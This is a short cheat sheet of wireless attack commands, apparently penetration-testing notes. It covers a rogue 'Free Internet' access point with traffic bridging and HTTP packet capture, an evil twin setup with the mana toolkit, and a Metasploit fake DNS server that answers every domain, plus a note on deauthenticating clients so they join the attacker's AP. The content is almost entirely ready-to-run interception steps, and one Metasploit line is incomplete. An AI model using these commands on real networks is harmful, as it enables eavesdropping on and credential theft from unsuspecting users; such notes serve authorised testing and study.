**Man in the Middle Attack**
```
# Put Wirekess interface to Monitor mode
$ airmon-ng start <intf>


# Start/Set-up Access Point
$ airbase-ng -c <channel> -e "Free Internet" <intf>


# Create a Network Bridge Interface
$ apt-get install bridge-utils                  # brctl: Command not found
$ brctl addbr br0
$ brctl addif br0 eth0
$ brctl addif br0 at0

> br0  = bridge interface
> eth0 = attacker wired interface
> at0  = virtual interface created by airbase-ng


# Assign IP Address to bridged interface
{
$ ifconfig eth0 0.0.0.0 up
$ ifconfig at0 0.0.0.0 up
}
$ ifconfig br0 <ip_address> up


# Enable Port-Forwarding
$ echo 1 > /proc/sys/net/ipv4/ip_forward


# Capture Packets/Data
> Wireshark
> Tcpdump
  tcpdump -nvi <intf> tcp port 80 -A

```


**Evil Twins Attack**
```
# https://github.com/sensepost/mana

$ apt install mana-toolkit                   # Linux Install
$ /usr/share/mana-toolkit/run-mana/          # Mana Scripts
$ /etc/mana-toolkit/hostapd-mana.conf        # Configuration File
$ /usr/share/mana-toolkit/www/portal         # Location of Landing Page


-----------------------------------------

# Metasploit - Fake DNS
msf > use auxiliary/server/fakedns
msf > SET TARGETACTION FAKE
msf > SET TARGETDOMAIN *
msf > SET 10.0.0.1
msf > exploit -j

-----------------------------------------




NOTE : Upon Deauthentication of the client, the client should auto-reconnect to the AP with the stronger signal ( The attacker controlled AP )
```


**WPA2-Enterprise**
```
# https://github.com/s0lst1c3/eaphammer

```


**Wardriving**
```
# https://play.google.com/store/apps/details?id=net.wigle.wigleandroid&hl=en

# https://wigle.net/
```


